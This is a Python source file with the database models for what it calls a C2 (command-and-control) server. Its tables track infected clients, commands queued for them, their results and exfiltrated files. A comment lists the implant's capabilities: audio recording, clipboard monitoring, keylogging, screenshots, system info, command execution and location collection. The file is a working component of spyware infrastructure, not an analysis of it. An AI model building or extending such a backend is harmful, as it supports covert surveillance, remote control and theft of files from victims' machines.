"""
Database models for C2 Server
"""

import logging
from datetime import datetime
from flask_sqlalchemy import SQLAlchemy

logger = logging.getLogger(__name__)
db = SQLAlchemy()


class Client(db.Model):
    """Client model - stores connected client information"""
    __tablename__ = 'clients'
    
    id = db.Column(db.String(255), primary_key=True)
    registered_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    last_seen = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    ip = db.Column(db.String(45), nullable=False)  # IPv6 max length
    status = db.Column(db.String(50), default='active')
    
    # Relationships
    commands = db.relationship('Command', back_populates='client', cascade='all, delete-orphan')
    results = db.relationship('Result', back_populates='client', cascade='all, delete-orphan')
    exfiltrated_files = db.relationship('ExfiltratedFile', back_populates='client', cascade='all, delete-orphan')
    
    def to_dict(self):
        """Convert client to dictionary"""
        return {
            'id': self.id,
            'registered_at': self.registered_at.isoformat(),
            'last_seen': self.last_seen.isoformat(),
            'ip': self.ip,
            'status': self.status
        }


class Command(db.Model):
    """Command model - stores pending commands for clients"""
    __tablename__ = 'commands'
    
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(255), db.ForeignKey('clients.id'), nullable=False)
    capability = db.Column(db.Integer, default=0, nullable=False)
    args = db.Column(db.Text, default='')
    created_at = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    executed = db.Column(db.Boolean, default=False)
    
    # Relationships
    client = db.relationship('Client', back_populates='commands')
    
    def to_dict(self):
        """Convert command to dictionary"""
        return {
            'id': self.id,
            'client_id': self.client_id,
            'capability': self.capability,
            'args': self.args,
            'created_at': self.created_at.isoformat(),
            'executed': self.executed
        }


class Result(db.Model):
    """Result model - stores execution results from clients"""
    __tablename__ = 'results'
    
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(255), db.ForeignKey('clients.id'), nullable=False)
    capability = db.Column(db.Integer, nullable=False)
    result = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    ip = db.Column(db.String(45), nullable=False)
    
    # Relationships
    client = db.relationship('Client', back_populates='results')
    
    def _detect_base64_type(self, base64_str):
        """Detect data type from base64 string"""
        if not base64_str or len(base64_str) < 50:
            return None
        
        # Check for common file signatures (magic numbers)
        prefix = base64_str[:50]
        
        # PNG signature
        if prefix.startswith('iVBORw0KGgo'):
            return 'image/png'
        # JPEG signature
        if prefix.startswith('/9j/'):
            return 'image/jpeg'
        # GIF signature
        if prefix.startswith('R0lGOD'):
            return 'image/gif'
        # BMP signature
        if prefix.startswith('Qk0'):
            return 'image/bmp'
        # WAV signature
        if prefix.startswith('UklGR'):
            return 'audio/wav'
        # MP3 signature
        if prefix.startswith('SUQz') or prefix.startswith('//v') or prefix.startswith('//s'):
            return 'audio/mpeg'
        # PDF signature
        if prefix.startswith('JVBERi0'):
            return 'application/pdf'
        
        return None
    
    def _is_base64(self, s):
        """Check if string appears to be base64 encoded"""
        if not s or len(s) == 0:
            return False
        import re
        # Check if it looks like base64 and is sufficiently long
        return bool(re.match(r'^[A-Za-z0-9+/]+={0,2}$', s) and len(s) % 4 == 0 and len(s) > 100)
    
    def _get_result_type(self):
        """Determine the result type based on capability and data"""
        # Capability-specific type mapping
        # 1 = Audio Recorder -> audio
        # 2 = Clipboard Monitor -> text (base64-encoded)
        # 3 = Keylogger -> text (base64-encoded)
        # 4 = Screenshot -> image
        # 5 = Info Collector -> text (base64-encoded)
        # 6 = Command Executor -> text
        # 7 = Location Collector -> text (base64-encoded)
        
        capability_types = {
            1: 'audio',
            2: 'text',
            3: 'text',
            4: 'image',
            5: 'text',
            6: 'text',
            7: 'text'
        }
        
        # Get expected type from capability
        expected_type = capability_types.get(self.capability, 'text')
        
        # If result is base64, detect actual type
        if self.result and self._is_base64(self.result):
            detected_type = self._detect_base64_type(self.result)
            if detected_type:
                if detected_type.startswith('image/'):
                    return 'image'
                elif detected_type.startswith('audio/'):
                    return 'audio'
                elif detected_type == 'application/pdf':
                    return 'pdf'
            # Base64 but no specific type detected - use expected type
            return expected_type
        
        return expected_type
    
    def to_dict(self):
        """Convert result to dictionary"""
        result_type = self._get_result_type()
        
        return {
            'id': self.id,
            'client': self.client_id,
            'capability': self.capability,
            'result': self.result,
            'result_type': result_type,
            'timestamp': self.timestamp.isoformat(),
            'ip': self.ip
        }


class ExfiltratedFile(db.Model):
    """ExfiltratedFile model - stores exfiltrated files from clients"""
    __tablename__ = 'exfiltrated_files'
    
    id = db.Column(db.Integer, primary_key=True)
    client_id = db.Column(db.String(255), db.ForeignKey('clients.id'), nullable=False)
    filename = db.Column(db.String(512), nullable=False)
    original_path = db.Column(db.Text)
    file_size = db.Column(db.Integer, nullable=False)
    content = db.Column(db.Text, nullable=False)  # Base64 encoded file content
    timestamp = db.Column(db.DateTime, default=datetime.utcnow, nullable=False)
    ip = db.Column(db.String(45), nullable=False)
    
    # Relationships
    client = db.relationship('Client', back_populates='exfiltrated_files')
    
    def to_dict(self, include_content=False):
        """Convert exfiltrated file to dictionary"""
        result = {
            'id': self.id,
            'client_id': self.client_id,
            'filename': self.filename,
            'original_path': self.original_path,
            'file_size': self.file_size,
            'timestamp': self.timestamp.isoformat(),
            'ip': self.ip
        }
        if include_content:
            result['content'] = self.content
        return result


def init_db(app):
    """Initialize database with proper error handling for concurrent workers"""
    db.init_app(app)
    with app.app_context():
        try:
            # Create all tables - this is idempotent and safe with preload
            db.create_all()
            db.session.commit()
            logger.info("Database tables created successfully")
        except Exception as e:
            # Log but don't fail - tables might already exist from another worker
            logger.warning(f"Database initialization warning (may be normal with multiple workers): {e}")
            db.session.rollback()
